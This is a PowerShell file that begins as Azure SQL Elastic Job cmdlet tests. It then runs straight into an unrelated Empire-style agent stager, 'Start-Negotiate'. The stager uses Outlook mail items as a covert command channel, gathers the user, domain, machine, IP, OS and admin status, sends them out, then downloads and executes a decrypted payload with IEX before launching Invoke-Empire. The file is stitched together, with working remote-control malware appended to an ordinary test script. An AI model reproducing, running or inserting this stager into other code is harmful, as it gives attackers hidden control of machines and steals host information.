














function Test-StartJob
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	
	$script = "SELECT 1"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script

	try
	{
		
		$je = Start-AzSqlElasticJob -ResourceGroupName $j1.ResourceGroupName -ServerName $j1.ServerName -AgentName $j1.AgentName -JobName $j1.JobName
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
		Assert-AreEqual 1 $je.JobVersion
		Assert-AreEqual Created $je.Lifecycle
		Assert-AreEqual Created $je.ProvisioningState

		
		$je = Start-AzSqlElasticJob -ParentObject $j1
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
		Assert-AreEqual 1 $je.JobVersion
		Assert-AreEqual Created $je.Lifecycle
		Assert-AreEqual Created $je.ProvisioningState

		
		$je = Start-AzSqlElasticJob -ParentResourceId $j1.ResourceId
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
		Assert-AreEqual 1 $je.JobVersion
		Assert-AreEqual Created $je.Lifecycle
		Assert-AreEqual Created $je.ProvisioningState

		
		$je = $j1 | Start-AzSqlElasticJob
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
		Assert-AreEqual 1 $je.JobVersion
		Assert-AreEqual Created $je.Lifecycle
		Assert-AreEqual Created $je.ProvisioningState
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}

}


function Test-StartJobWait
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	
	$script = "SELECT 1"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script

	try
	{
		
		$je = $j1 | Start-AzSqlElasticJob -Wait
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
		Assert-AreEqual 1 $je.JobVersion
		Assert-AreEqual Succeeded $je.Lifecycle
		Assert-AreEqual Succeeded $je.ProvisioningState
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-StopJob
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	$script = "WAITFOR DELAY '00:10:00'"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script

	
	$je = $j1 | Start-AzSqlElasticJob

	try
	{
		
		$resp = Stop-AzSqlElasticJob -ResourceGroupName $je.ResourceGroupName -ServerName $je.ServerName `
			-AgentName $je.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId

		
		$resp = Stop-AzSqlElasticJob -ParentObject $je
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId

		
		$resp = Stop-AzSqlElasticJob -ParentResourceId $je.ResourceId
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId

		
		$resp = $je | Stop-AzSqlElasticJob
		Assert-AreEqual $je.ResourceGroupName $j1.ResourceGroupName
		Assert-AreEqual $je.ServerName $j1.ServerName
		Assert-AreEqual $je.AgentName $j1.AgentName
		Assert-AreEqual $je.JobName $j1.JobName
		Assert-NotNull $je.JobExecutionId
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}

}


function Test-GetJobExecution
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	$script = "SELECT 1"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script
	$je = $j1 | Start-AzSqlElasticJob -Wait

	try
	{
		
		$allExecutions = Get-AzSqlElasticJobExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName `
			-AgentName $a1.AgentName -Count 10
		$jobExecutions = Get-AzSqlElasticJobExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName `
			-AgentName $a1.AgentName -JobName $j1.JobName -Count 10
		$jobExecution = Get-AzSqlElasticJobExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName `
			-AgentName $a1.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId

		
		Assert-AreEqual $je.ResourceGroupName $jobExecution.ResourceGroupName
		Assert-AreEqual $je.ServerName $jobExecution.ServerName
		Assert-AreEqual $je.AgentName $jobExecution.AgentName
		Assert-AreEqual $je.JobName $jobExecution.JobName
		Assert-AreEqual $je.JobExecutionId $jobExecution.JobExecutionId
		Assert-AreEqual $je.Lifecycle $jobExecution.Lifecycle
		Assert-AreEqual $je.ProvisioningState $jobExecution.ProvisioningState
		Assert-AreEqual $je.LastMessage $jobExecution.LastMessage
		Assert-AreEqual $je.CurrentAttemptStartTime $jobExecution.CurrentAttemptStartTime
		Assert-AreEqual $je.StartTime $jobExecution.StartTime
		Assert-AreEqual $je.EndTime $jobExecution.EndTime
		Assert-AreEqual $je.JobVersion $jobExecution.JobVersion

		
		$allExecutions = Get-AzSqlElasticJobExecution -ParentObject $a1 -Count 10
		$jobExecutions = Get-AzSqlElasticJobExecution -ParentObject $a1 -JobName $j1.JobName -Count 10
		$jobExecution = Get-AzSqlElasticJobExecution -ParentObject $a1 -JobName $j1.JobName -JobExecutionId $je.JobExecutionId

		
		Assert-AreEqual $je.ResourceGroupName $jobExecution.ResourceGroupName
		Assert-AreEqual $je.ServerName $jobExecution.ServerName
		Assert-AreEqual $je.AgentName $jobExecution.AgentName
		Assert-AreEqual $je.JobName $jobExecution.JobName
		Assert-AreEqual $je.JobExecutionId $jobExecution.JobExecutionId
		Assert-AreEqual $je.Lifecycle $jobExecution.Lifecycle
		Assert-AreEqual $je.ProvisioningState $jobExecution.ProvisioningState
		Assert-AreEqual $je.LastMessage $jobExecution.LastMessage
		Assert-AreEqual $je.CurrentAttemptStartTime $jobExecution.CurrentAttemptStartTime
		Assert-AreEqual $je.StartTime $jobExecution.StartTime
		Assert-AreEqual $je.EndTime $jobExecution.EndTime
		Assert-AreEqual $je.JobVersion $jobExecution.JobVersion

		
		$allExecutions = Get-AzSqlElasticJobExecution -ParentResourceId $a1.ResourceId -Count 10
		$jobExecutions = Get-AzSqlElasticJobExecution -ParentResourceId $a1.ResourceId -JobName $j1.JobName -Count 10
		$jobExecution = Get-AzSqlElasticJobExecution -ParentResourceId $a1.ResourceId -JobName $j1.JobName -JobExecutionId $je.JobExecutionId

		
		Assert-AreEqual $je.ResourceGroupName $jobExecution.ResourceGroupName
		Assert-AreEqual $je.ServerName $jobExecution.ServerName
		Assert-AreEqual $je.AgentName $jobExecution.AgentName
		Assert-AreEqual $je.JobName $jobExecution.JobName
		Assert-AreEqual $je.JobExecutionId $jobExecution.JobExecutionId
		Assert-AreEqual $je.Lifecycle $jobExecution.Lifecycle
		Assert-AreEqual $je.ProvisioningState $jobExecution.ProvisioningState
		Assert-AreEqual $je.LastMessage $jobExecution.LastMessage
		Assert-AreEqual $je.CurrentAttemptStartTime $jobExecution.CurrentAttemptStartTime
		Assert-AreEqual $je.StartTime $jobExecution.StartTime
		Assert-AreEqual $je.EndTime $jobExecution.EndTime
		Assert-AreEqual $je.JobVersion $jobExecution.JobVersion

		
		$allExecutions = $a1 | Get-AzSqlElasticJobExecution -Count 10
		$jobExecutions = $a1 | Get-AzSqlElasticJobExecution -JobName $j1.JobName -Count 10
		$jobExecution = $a1 | Get-AzSqlElasticJobExecution -JobName $j1.JobName -JobExecutionId $je.JobExecutionId

		
		Assert-AreEqual $je.ResourceGroupName $jobExecution.ResourceGroupName
		Assert-AreEqual $je.ServerName $jobExecution.ServerName
		Assert-AreEqual $je.AgentName $jobExecution.AgentName
		Assert-AreEqual $je.JobName $jobExecution.JobName
		Assert-AreEqual $je.JobExecutionId $jobExecution.JobExecutionId
		Assert-AreEqual $je.Lifecycle $jobExecution.Lifecycle
		Assert-AreEqual $je.ProvisioningState $jobExecution.ProvisioningState
		Assert-AreEqual $je.LastMessage $jobExecution.LastMessage
		Assert-AreEqual $je.CurrentAttemptStartTime $jobExecution.CurrentAttemptStartTime
		Assert-AreEqual $je.StartTime $jobExecution.StartTime
		Assert-AreEqual $je.EndTime $jobExecution.EndTime
		Assert-AreEqual $je.JobVersion $jobExecution.JobVersion

		
		$allExecutions = $a1 | Get-AzSqlElasticJobExecution -Count 10 -CreateTimeMin "2018-05-31T23:58:57" -CreateTimeMax "2018-07-31T23:58:57" -EndTimeMin "2018-06-30T23:58:57" -EndTimeMax "2018-07-31T23:58:57" -Active
		$jobExecutions = $a1 | Get-AzSqlElasticJobExecution -Count 10 -CreateTimeMin "2018-05-31T23:58:57" -CreateTimeMax "2018-07-31T23:58:57" -EndTimeMin "2018-06-30T23:58:57" -EndTimeMax "2018-07-31T23:58:57" -Active
		Assert-Null $allExecutions
		Assert-Null $jobExecutions
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-GetJobStepExecution
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	$script = "SELECT 1"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script
	$je = $j1 | Start-AzSqlElasticJob -Wait

	try
	{
		
		$allStepExecutions = Get-AzSqlElasticJobStepExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId
		$stepExecution = Get-AzSqlElasticJobStepExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId -StepName $js1.StepName

		
		Assert-AreEqual $stepExecution.ResourceGroupName $a1.ResourceGroupName
		Assert-AreEqual $stepExecution.ServerName $a1.ServerName
		Assert-AreEqual $stepExecution.AgentName $a1.AgentName
		Assert-AreEqual $stepExecution.JobName $j1.JobName
		Assert-AreEqual $stepExecution.JobExecutionId $je.JobExecutionId
		Assert-AreEqual $stepExecution.StepName $js1.StepName

		
		$allStepExecutions = Get-AzSqlElasticJobStepExecution -ParentObject $je
		$stepExecution = Get-AzSqlElasticJobStepExecution -ParentObject $je -StepName $js1.StepName

		
		Assert-AreEqual $stepExecution.ResourceGroupName $a1.ResourceGroupName
		Assert-AreEqual $stepExecution.ServerName $a1.ServerName
		Assert-AreEqual $stepExecution.AgentName $a1.AgentName
		Assert-AreEqual $stepExecution.JobName $j1.JobName
		Assert-AreEqual $stepExecution.JobExecutionId $je.JobExecutionId
		Assert-AreEqual $stepExecution.StepName $js1.StepName


		
		$allStepExecutions = Get-AzSqlElasticJobStepExecution -ParentResourceId $je.ResourceId
		$stepExecution = Get-AzSqlElasticJobStepExecution -ParentResourceId $je.ResourceId -StepName $js1.StepName

		
		Assert-AreEqual $stepExecution.ResourceGroupName $a1.ResourceGroupName
		Assert-AreEqual $stepExecution.ServerName $a1.ServerName
		Assert-AreEqual $stepExecution.AgentName $a1.AgentName
		Assert-AreEqual $stepExecution.JobName $j1.JobName
		Assert-AreEqual $stepExecution.JobExecutionId $je.JobExecutionId
		Assert-AreEqual $stepExecution.StepName $js1.StepName

		
		$allStepExecutions = $je | Get-AzSqlElasticJobStepExecution
		$stepExecution = $je | Get-AzSqlElasticJobStepExecution -StepName $js1.StepName

		
		Assert-AreEqual $stepExecution.ResourceGroupName $a1.ResourceGroupName
		Assert-AreEqual $stepExecution.ServerName $a1.ServerName
		Assert-AreEqual $stepExecution.AgentName $a1.AgentName
		Assert-AreEqual $stepExecution.JobName $j1.JobName
		Assert-AreEqual $stepExecution.JobExecutionId $je.JobExecutionId
		Assert-AreEqual $stepExecution.StepName $js1.StepName

		
		$allStepExecutions = $je | Get-AzSqlElasticJobStepExecution -CreateTimeMin "2018-05-31T23:58:57" `
			-CreateTimeMax "2018-07-31T23:58:57" -EndTimeMin "2018-06-30T23:58:57" -EndTimeMax "2018-07-31T23:58:57" -Active
		Assert-Null $allStepExecutions
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-GetJobTargetExecution
{
	
	$a1 = Create-ElasticJobAgentTestEnvironment

	$script = "SELECT 1"
	$s1 = Get-AzSqlServer -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName
	$credential = Get-Credential $s1.SqlAdministratorLogin
	$jc1 = $a1 | New-AzSqlElasticJobCredential -Name (Get-UserName) -Credential $credential
	$tg1 = $a1 | New-AzSqlElasticJobTargetGroup -Name (Get-TargetGroupName)
	$tg1 | Add-AzSqlElasticJobTarget -ServerName $a1.ServerName -DatabaseName $a1.DatabaseName
	$j1 = Create-JobForTest $a1
	$js1 = Create-JobStepForTest $j1 $tg1 $jc1 $script
	$je = $j1 | Start-AzSqlElasticJob -Wait

	try
	{
		
		$allTargetExecutions = Get-AzSqlElasticJobTargetExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName `
			-AgentName $a1.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId -Count 10
		$stepTargetExecutions = Get-AzSqlElasticJobTargetExecution -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName `
			-AgentName $a1.AgentName -JobName $j1.JobName -JobExecutionId $je.JobExecutionId -StepName $js1.StepName -Count 10

		
		$allTargetExecutions = Get-AzSqlElasticJobTargetExecution -ParentObject $je -Count 10
		$stepTargetExecutions = Get-AzSqlElasticJobTargetExecution -ParentObject $je -StepName $js1.StepName -Count 10

		
		$allTargetExecutions = Get-AzSqlElasticJobTargetExecution -ParentResourceId $je.ResourceId -Count 10
		$stepTargetExecutions = Get-AzSqlElasticJobTargetExecution -ParentResourceId $je.ResourceId -StepName $js1.StepName -Count 10

		
		$allTargetExecutions = $je | Get-AzSqlElasticJobTargetExecution -Count 10
		$stepTargetExecutions = $je | Get-AzSqlElasticJobTargetExecution -StepName $js1.StepName -Count 10

		$targetExecution = $stepTargetExecutions[0]

		
		Assert-AreEqual $targetExecution.ResourceGroupName $a1.ResourceGroupName
		Assert-AreEqual $targetExecution.ServerName $a1.ServerName
		Assert-AreEqual $targetExecution.AgentName $a1.AgentName
		Assert-AreEqual $targetExecution.JobName $j1.JobName
		Assert-NotNull  $targetExecution.JobExecutionId
		Assert-NotNull 	$targetExecution.StepName
		Assert-AreEqual $targetExecution.TargetServerName $a1.ServerName
		Assert-AreEqual $targetExecution.TargetDatabaseName $a1.DatabaseName

		
		$allTargetExecutions = $je | Get-AzSqlElasticJobTargetExecution -Count 10 -CreateTimeMin "2018-05-31T23:58:57" -CreateTimeMax "2018-07-31T23:58:57" -EndTimeMin "2018-06-30T23:58:57" -EndTimeMax "2018-07-31T23:58:57" -Active
		$stepTargetExecutions = $je | Get-AzSqlElasticJobTargetExecution -StepName $js1.StepName -Count 10 -CreateTimeMin "2018-05-31T23:58:57" -CreateTimeMax "2018-07-31T23:58:57" -EndTimeMin "2018-06-30T23:58:57" -EndTimeMax "2018-07-31T23:58:57" -Active
		Assert-Null $allTargetExecutions
		Assert-Null $stepTargetExecutions
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}function Start-Negotiate {
    param($s,$SK,$UA)

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            
            $IV = $In[0..15];
            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16);
        }
    }

    
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;

    $SKB=$e.GetBytes($SK);
    
    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    $rk=$rs.ToXmlString($False);

    
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);

    
    $ib=$e.getbytes($rk);

    
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    
    
    
    
    
    
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    

    $c = [Convert]::ToBase64String($rc4p);
    $mail = $outlook.CreateItem(0);
    $mail.Subject = "mailpireout";
    $mail.Body = "POST - "+$c;
    $mail.save() | out-null;
    $mail.Move($fld)| out-null;

    

    $break = $False;

    While ($break -ne $True){
      $fld.Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;
      $fld.Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $raw=[System.Convert]::FromBase64String($_.Body);$_.Delete();}; 
      Start-Sleep -s 2;
    }

    
    $de=$e.GetString($rs.decrypt($raw,$false));

    
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    
    $nonce=[String]([long]$nonce + 1);

    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    
    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;

    
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    
    
    
    
    
    
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    

    $c = [Convert]::ToBase64String($rc4p2);
    $mail = $outlook.CreateItem(0);
    $mail.Subject = "mailpireout";
    $mail.Body = "POST - "+$c;
    $mail.save() | out-null;
    $mail.Move($fld)| out-null;

    
    $break = $False;

    While ($break -ne $True){
      $fld.Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;
      $fld.Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $raw=[System.Convert]::FromBase64String($_.Body);$_.Delete();}; 
      Start-Sleep -s 2;
    }

    while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} ;

    
    
    
    
    try {
      $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
      
      IEX $($pppp);
    } catch {
      write-host $_.Exception.Message;
    }
    
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE";
}

Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA 'REPLACE_EMAIL';
